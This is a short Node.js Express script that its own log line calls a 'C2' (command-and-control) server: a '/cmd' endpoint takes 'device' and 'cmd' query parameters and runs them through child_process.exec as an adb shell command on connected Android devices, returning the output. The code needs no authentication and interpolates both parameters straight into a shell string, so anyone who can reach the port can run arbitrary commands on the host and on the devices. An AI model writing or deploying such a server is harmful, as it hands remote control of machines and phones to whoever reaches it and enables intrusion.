const express = require('express');  
const app = express();  

app.get('/cmd', (req, res) => {  
  const { device, cmd } = req.query;  
  require('child_process').exec(`adb -s ${device} shell ${cmd}`, (err, stdout) => {  
    res.send(stdout || err.message);  
  });  
});  

app.listen(3000, () => console.log('[+] C2 Active: http://localhost:3000'));  
